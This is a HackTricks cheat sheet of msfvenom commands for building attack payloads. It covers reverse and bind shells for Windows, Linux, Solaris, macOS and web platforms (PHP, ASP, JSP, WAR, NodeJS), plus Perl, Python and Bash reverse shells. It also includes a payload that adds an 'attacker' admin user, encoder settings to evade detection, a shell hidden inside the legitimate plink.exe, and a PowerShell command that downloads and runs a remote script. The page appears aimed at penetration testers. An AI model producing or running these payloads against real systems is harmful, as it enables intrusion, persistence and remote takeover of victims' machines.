source: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom#listing

**MSFVenom - CheatSheet**
<pre>msfvenom -p (PAYLOAD) -e (ENCODER) -f (FORMAT) -i (ENCODE COUNT) LHOST=(IP) </pre>
One can also use the -a to specify the architecture or the --platform

**Listing**
<pre>msfvenom -l #Payloads</pre>
<pre>msfvenom -l encoders #Encoders </pre>

**Common params when creating a shellcode**
<pre> -b "\x00\x0a\x0d" </pre>
<pre> -f c </pre>
<pre> -e x86/shikata_ga_nai -i 5 </pre>
<pre>EXITFUNC=thread </pre>
<pre> PrependSetuid=True #Use this to create a shellcode that will execute something with SUID </pre>


**Windows**
---
**Reverse Shell**
<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe </pre>
**Bind Shell**
<pre>msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe </pre>
**Create User**
<pre>msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe </pre>
**CMD Shell**
<pre> msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe </pre>
**Execute Command**
<pre> msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe </pre>
<pre>msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe </pre>
**Encoder**
<pre>msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe </pre>
**Embedded inside executable**
<pre>msfvenom -p windows/shell_reverse_tcp LHOST=(IP) LPORT=(PORT) -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe </pre>

**Linux Payloads**
---
**Reverse Shell**
<pre>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf </pre>
<pre>msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf </pre>
**Bind Shell**
<pre>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf </pre>
**SunOS (Solaris)**
<pre>msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf </pre>

**MAC Payloads**
---
**Reverse Shell**
<pre>msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho </pre>
**Bind Shell**
<pre>msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho </pre>

**Web Based Payloads**
---
**PHP Reverse Shell**
<pre>msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php </pre>
<pre>cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php </pre>

**ASP/x Reverse Shell**
<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp</pre>
<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx </pre>

**JSP Reverse Shell**
<pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp </pre>
**WAR Reverse Shell**
<pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war </pre>
**NodeJS Reverse Shell**
<pre>msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) </pre>
**Script Language payloads**
---
**Perl**
<pre>msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl </pre>
**Python**
<pre>msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py </pre>
**Bash**
<pre>msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh </pre>
